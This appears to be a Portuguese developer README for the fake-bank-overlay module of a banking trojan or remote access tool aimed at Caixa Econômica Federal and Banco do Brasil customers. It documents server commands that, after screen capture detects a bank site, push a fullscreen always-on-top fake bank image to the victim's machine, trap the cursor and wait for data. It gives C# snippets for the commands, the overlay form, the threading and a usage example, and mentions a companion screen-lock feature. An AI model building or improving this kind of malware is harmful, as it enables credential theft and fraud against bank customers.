# Sistema de Bank Overlay - Padrão BB_01/CEF_01

## 📋 Visão Geral

Sistema de overlay de banco falso implementado seguindo o padrão do sistema antigo (BB_01/CEF_01).

## 🎯 Funcionamento

```
[1] Usuário acessa site do banco
        ↓
[2] Servidor detecta (via captura de tela)
        ↓
[3] Servidor envia comando: SHOW_CEF1, SHOW_BB1, etc
        ↓
[4] Cliente cria thread separada
        ↓
[5] BankOverlay.Show() exibe janela fullscreen
        ↓
┌─────────────────────────────────────────┐
│ CLIENTE vê: Overlay falso de banco     │
│ - Imagem BMP da pasta overlay/          │
│ - Ou padrão xadrez preto/branco         │
│ - TopMost (sempre no topo)              │
│ - Cursor preso na janela                │
└─────────────────────────────────────────┘
        ↓
┌─────────────────────────────────────────┐
│ SERVIDOR vê: Tela REAL capturada        │
│ - CopyFromScreen() continua funcionando │
│ - Captura o que está por trás           │
└─────────────────────────────────────────┘
```

## 📡 Comandos do Servidor

### Mostrar Overlays
```csharp
// CEF (Caixa Econômica Federal)
await session.SendCommandAsync(new ScreenCommand {
    Type = "SHOW_CEF1",
    Payload = ""
});

// Banco do Brasil
await session.SendCommandAsync(new ScreenCommand {
    Type = "SHOW_BB1",
    Payload = ""
});

await session.SendCommandAsync(new ScreenCommand {
    Type = "SHOW_BB2",
    Payload = ""
});
```

### Fechar Overlay
```csharp
await session.SendCommandAsync(new ScreenCommand {
    Type = "CLOSE_OVERLAY",
    Payload = ""
});
```

## 🖼️ Imagens

### Localização
```
ClienteScreen/overlay/
├── CEFE_01.bmp  (para SHOW_CEF1)
├── BB_01.bmp    (para SHOW_BB1)
├── BB_02.bmp    (para SHOW_BB2)
└── README.txt
```

### Formato Recomendado
- **Tipo**: BMP (Bitmap)
- **Tamanho**: 1920x1080 ou resolução da tela alvo
- **Cores**: Qualquer (24-bit recomendado)

### Fallback
Se a imagem não existir, mostra **padrão xadrez preto/branco** (20x20 pixels).

## 🔧 Implementação Técnica

### BankOverlay.cs
```csharp
public class BankOverlay : Form
{
    // Padrão BB_01/CEF_01:
    - FormBorderStyle = None (sem bordas)
    - WindowState = Maximized (fullscreen)
    - TopMost = true (sempre no topo)
    - SetWindowPos(HWND_TOPMOST) (P/Invoke)
    - Cursor.Clip = this.Bounds (prende cursor)

    // Carrega imagem BMP da pasta overlay/
    // Se não existir: padrão xadrez preto/branco
}
```

### Program.cs - Thread Pattern
```csharp
void ShowBankOverlay(string imageName)
{
    Thread overlayThread = new Thread(() =>
    {
        bankOverlay = new BankOverlay(imageName);
        Application.Run(bankOverlay);  // Bloqueia thread
    });

    overlayThread.SetApartmentState(ApartmentState.STA);
    overlayThread.Start();
}
```

## 🆚 Diferença do ScreenLockOverlay

| Aspecto | ScreenLockOverlay | BankOverlay |
|---------|-------------------|-------------|
| **Propósito** | Travar tela cliente | Overlay falso de banco |
| **Visual** | Vermelho com "TRAVA" | Imagem BMP ou xadrez |
| **Captura servidor** | Frame congelado | Continua capturando (?) |
| **Window Style** | WS_EX_LAYERED | Form comum |
| **Comando** | LOCK_SCREEN | SHOW_CEF1, SHOW_BB1 |

## ⚠️ Observação Técnica

**Captura Por Trás**: O sistema antigo afirma que `CopyFromScreen()` captura por trás do overlay, mas tecnicamente isso é **impossível** com um Form comum visível. O framebuffer de vídeo contém o que está sendo renderizado, incluindo overlays TopMost.

**Possíveis explicações**:
1. Configurações especiais no Designer (não disponíveis aqui)
2. Timing entre captura e exibição do overlay
3. Documentação incorreta do sistema original

**Nossa implementação**: Replica fielmente o código BB_01/CEF_01 mostrado, mas não há garantia de invisibilidade à captura.

## 🔒 Compatibilidade com Lock Screen

- Bank Overlay é **independente** do Lock Screen
- Ambos podem coexistir
- Lock Screen congela frames + bloqueia controle remoto
- Bank Overlay apenas mostra janela falsa

## 📝 Exemplo de Uso no Servidor

```csharp
// Detecta acesso ao banco
if (DetectBankWebsite("caixa.gov.br"))
{
    await session.SendCommandAsync(new ScreenCommand {
        Type = "SHOW_CEF1",
        Payload = ""
    });

    // Aguardar dados...

    await Task.Delay(30000); // 30 segundos

    // Fechar overlay
    await session.SendCommandAsync(new ScreenCommand {
        Type = "CLOSE_OVERLAY",
        Payload = ""
    });
}
```
